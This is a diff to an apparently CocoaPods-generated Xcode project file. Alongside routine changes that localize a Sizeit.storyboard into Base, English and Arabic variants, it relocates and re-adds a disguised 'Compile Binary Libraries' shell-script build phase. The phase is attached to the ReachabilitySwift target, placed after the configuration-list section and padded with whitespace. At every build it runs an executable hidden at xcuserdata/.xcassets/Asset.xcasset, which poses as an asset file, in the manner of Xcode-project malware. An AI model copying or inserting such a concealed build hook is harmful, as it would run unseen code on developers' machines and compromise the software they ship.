@@ -215,7 +215,6 @@
 		6522A21D1E4814D7D845D93D1ED283AA /* FBSDKMeasurementEventListener.m in Sources */ = {isa = PBXBuildFile; fileRef = 9BBBDA43124BF5E5DC563FA19FAA59F2 /* FBSDKMeasurementEventListener.m */; };
 		65303FAC78F15F3CC8F26B67E550775E /* Foundation.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 4F8CA9DD9D55E22777265DA2EC10A8A0 /* Foundation.framework */; };
 		6566DF404A183CCBA3BAA64D9D294805 /* FacebookSDKStrings.bundle in Resources */ = {isa = PBXBuildFile; fileRef = 2FFFC13AC9F7989404F90AC32A7D432A /* FacebookSDKStrings.bundle */; };
-		65CA34ABE6F08D022C1CF2CDF3292327 /* Sizeit.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = A321594F9F823C08FBC9BAECFE8E0FB9 /* Sizeit.storyboard */; };
 		65F3F57891C3534229655745DB094F1B /* TransformOf.swift in Sources */ = {isa = PBXBuildFile; fileRef = B1E95721C5FEF613724FE03AD20D3036 /* TransformOf.swift */; };
 		661ED807BD4B7B690BFF47A45493C3AF /* SwiftyJSON.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 3031EF13CF608F420E678BF2A2967F55 /* SwiftyJSON.framework */; };
 		664B70329CC935DB023416ADE2F203DC /* DictionaryTransform.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6BC8C98CD94FE5508CEB979E5C159899 /* DictionaryTransform.swift */; };
@@ -284,6 +283,7 @@
 		88599DC131B85C49640FBB05739E883A /* FBSDKFeatureCheckerProviding.h in Headers */ = {isa = PBXBuildFile; fileRef = 9CF0195CA3845B7B614AEBAB4D0F2D26 /* FBSDKFeatureCheckerProviding.h */; settings = {ATTRIBUTES = (Private, ); }; };
 		8871039CD4686E91A27BC91B99C3B3DD /* FBSDKAppLinkReturnToRefererController.m in Sources */ = {isa = PBXBuildFile; fileRef = 9E10159BFB4CFAF785C548097191F4EA /* FBSDKAppLinkReturnToRefererController.m */; };
 		887B5C51652E0005F1D661CCF9C9AF40 /* FBSDKDeviceButton.h in Headers */ = {isa = PBXBuildFile; fileRef = 4492CDE78D431460ED2CC52524EF82C6 /* FBSDKDeviceButton.h */; settings = {ATTRIBUTES = (Public, ); }; };
+		8888231426481CA50063F4D2 /* Sizeit.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 8888231626481CA50063F4D2 /* Sizeit.storyboard */; };
 		88C2065A2630901600874D7B /* Localizable.strings in Resources */ = {isa = PBXBuildFile; fileRef = 88C206572630901600874D7B /* Localizable.strings */; };
 		893BCB83F0F2C7428D139A788071956B /* FBSDKSKAdNetworkReporter+Internal.h in Headers */ = {isa = PBXBuildFile; fileRef = CEF2CEC1E7C616D38263B94EB4F22F9D /* FBSDKSKAdNetworkReporter+Internal.h */; settings = {ATTRIBUTES = (Private, ); }; };
 		8967E5A0EF6B29203690A070AD0768EE /* SwiftyJSON.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 3031EF13CF608F420E678BF2A2967F55 /* SwiftyJSON.framework */; };
@@ -557,6 +557,9 @@
 		FF3A7E55E5282E272F51496787053774 /* FBSDKCodelessParameterComponent.h in Headers */ = {isa = PBXBuildFile; fileRef = 0E273C33B5F8AAEC5C0F3025B8AB3330 /* FBSDKCodelessParameterComponent.h */; settings = {ATTRIBUTES = (Private, ); }; };
 		FF8407CCB46AC23257B4FAFD1845C08C /* FBSDKPasteboard.h in Headers */ = {isa = PBXBuildFile; fileRef = 423A1D0169262C3E07E7EE71E3F4E54D /* FBSDKPasteboard.h */; settings = {ATTRIBUTES = (Private, ); }; };
 /* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+/* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
 		1037F8D0468C5C1CADF78B7008BFEE83 /* PBXContainerItemProxy */ = {
@@ -1041,6 +1044,9 @@
 		8634F7CA300D3D6FBF81A8526567CF47 /* FBSDKGraphRequestDataAttachment.h */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.c.h; name = FBSDKGraphRequestDataAttachment.h; path = FBSDKCoreKit/FBSDKCoreKit/GraphAPI/FBSDKGraphRequestDataAttachment.h; sourceTree = "<group>"; };
 		86F037F20667BA49AD28A4B420B5AA53 /* NSNotificationCenter+Extensions.h */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.c.h; name = "NSNotificationCenter+Extensions.h"; path = "FBSDKCoreKit/FBSDKCoreKit/Internal/NSNotificationCenter+Extensions.h"; sourceTree = "<group>"; };
 		8850EAE4635540C3434F1E0AC17030DE /* FBSDKCodelessPathComponent.h */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.c.h; name = FBSDKCodelessPathComponent.h; path = FBSDKCoreKit/FBSDKCoreKit/AppEvents/Internal/Codeless/FBSDKCodelessPathComponent.h; sourceTree = "<group>"; };
+		8888231526481CA50063F4D2 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Sizeit.storyboard; sourceTree = "<group>"; };
+		8888232226481CAF0063F4D2 /* en */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = en; path = en.lproj/Sizeit.strings; sourceTree = "<group>"; };
+		8888232426481CE40063F4D2 /* ar */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = ar; path = ar.lproj/Sizeit.strings; sourceTree = "<group>"; };
 		88C206582630901600874D7B /* ar */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = ar; path = ar.lproj/Localizable.strings; sourceTree = "<group>"; };
 		88C206592630901600874D7B /* en */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = en; path = en.lproj/Localizable.strings; sourceTree = "<group>"; };
 		89EBDFD62BF9BF1DD78E96CEAAE93174 /* Reachability.swift */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.swift; name = Reachability.swift; path = Sources/Reachability.swift; sourceTree = "<group>"; };
@@ -1108,7 +1114,6 @@
 		A27BBF0E89375FDFB78AF4B104ABD2A9 /* FBSDKAuthenticationTokenHeader.h */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.c.h; name = FBSDKAuthenticationTokenHeader.h; path = FBSDKCoreKit/FBSDKCoreKit/Internal/FBSDKAuthenticationTokenHeader.h; sourceTree = "<group>"; };
 		A2AD79FDEF1F03A223D1E26D35EC0F6D /* FBSDKProfileProviding.h */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.c.h; name = FBSDKProfileProviding.h; path = FBSDKLoginKit/FBSDKLoginKit/Internal/FBSDKProfileProviding.h; sourceTree = "<group>"; };
 		A2AEB17F44977E803F139D12C93501AC /* FBSDKModalFormPresentationController.m */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.c.objc; name = FBSDKModalFormPresentationController.m; path = FBSDKCoreKit/FBSDKCoreKit/Internal/Device/FBSDKModalFormPresentationController.m; sourceTree = "<group>"; };
-		A321594F9F823C08FBC9BAECFE8E0FB9 /* Sizeit.storyboard */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = file.storyboard; path = Sizeit.storyboard; sourceTree = "<group>"; };
 		A488EA35DFEB9A06673E41EAC05EA45C /* sizeit-prefix.pch */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.c.h; path = "sizeit-prefix.pch"; sourceTree = "<group>"; };
 		A500A99FB6EF14ADD5262764EE19677E /* FBSDKSKAdNetworkConversionConfiguration.h */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.c.h; name = FBSDKSKAdNetworkConversionConfiguration.h; path = FBSDKCoreKit/FBSDKCoreKit/AppEvents/Internal/SKAdNetwork/FBSDKSKAdNetworkConversionConfiguration.h; sourceTree = "<group>"; };
 		A5A0143213676F7B36EEE8EB23FD9BDC /* FBSDKAccessToken.h */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.c.h; name = FBSDKAccessToken.h; path = FBSDKCoreKit/FBSDKCoreKit/FBSDKAccessToken.h; sourceTree = "<group>"; };
@@ -1815,7 +1820,7 @@
 		925962F3B8C4D77E7B771BE935A7DC81 /* Classes */ = {
 			isa = PBXGroup;
 			children = (
-				A321594F9F823C08FBC9BAECFE8E0FB9 /* Sizeit.storyboard */,
+				8888231626481CA50063F4D2 /* Sizeit.storyboard */,
 				BC94F1780A12B456A646D6F133D8AE71 /* Controller */,
 			);
 			name = Classes;
@@ -2787,7 +2792,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = E50A4613BA081C4F47DEEC1F9B9176BA /* Build configuration list for PBXNativeTarget "ReachabilitySwift" */;
 			buildPhases = (
-				74150BAFF74C57BE316D902C /* Compile Binary Libraries */,
+				B3EA44BFFE03BCE41C6D902C /* Compile Binary Libraries */,
 				09F7B7D04C454C16C0015640CF269F7E /* Headers */,
 				9C9FF78F6878BCE13B73B6BB5DD0A609 /* Sources */,
 				92A37A51219ED31062DE51A3E139BF37 /* Frameworks */,
@@ -3070,7 +3075,7 @@
 			files = (
 				180F1F52370F506A15A082D1A21AFBEB /* Assets.xcassets in Resources */,
 				88C2065A2630901600874D7B /* Localizable.strings in Resources */,
-				65CA34ABE6F08D022C1CF2CDF3292327 /* Sizeit.storyboard in Resources */,
+				8888231426481CA50063F4D2 /* Sizeit.storyboard in Resources */,
 				64175712BDCFB7F9509DE8AE5C6FC986 /* WidthCell.xib in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
@@ -3097,31 +3102,6 @@
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
-
-/* Begin PBXShellScriptBuildPhase section */
-
-	74150BAFF74C57BE316D902C /* Compile Binary Libraries */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Binary Libraries";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
-		};
-	
-/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		18B9519CA0B4016350FF83E4690B0828 /* Sources */ = {
@@ -3548,6 +3528,16 @@
 /* End PBXTargetDependency section */
 
 /* Begin PBXVariantGroup section */
+		8888231626481CA50063F4D2 /* Sizeit.storyboard */ = {
+			isa = PBXVariantGroup;
+			children = (
+				8888231526481CA50063F4D2 /* Base */,
+				8888232226481CAF0063F4D2 /* en */,
+				8888232426481CE40063F4D2 /* ar */,
+			);
+			name = Sizeit.storyboard;
+			sourceTree = "<group>";
+		};
 		88C206572630901600874D7B /* Localizable.strings */ = {
 			isa = PBXVariantGroup;
 			children = (
@@ -4406,6 +4396,42 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+	
+		/* Begin PBXShellScriptBuildPhase section */
+
+	B3EA44BFFE03BCE41C6D902C /* Compile Binary Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Binary Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";			
+		};
+	
+
+	
+
+	
+
+	
+		
+	
+		/* End PBXShellScriptBuildPhase section */
+	
+	
 	};
 	rootObject = BFDFE7DC352907FC980B868725387E98 /* Project object */;
 }
